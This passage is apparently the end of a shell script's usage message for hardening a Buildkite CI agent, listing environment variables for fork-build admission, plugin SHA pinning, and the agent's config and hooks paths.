  HTH_ALLOW_FORK_BUILDS              'true' to admit fork PR builds (default false)
  HTH_REQUIRE_PLUGIN_SHA             'true' to demand 40-hex plugin pins
  BUILDKITE_AGENT_CONFIG             default /etc/buildkite-agent/buildkite-agent.cfg
  BUILDKITE_HOOKS_PATH               default /etc/buildkite-agent/hooks

The agent reads its config once at start. Apply, restart, then audit.
USAGE
    exit 2 ;;
esac
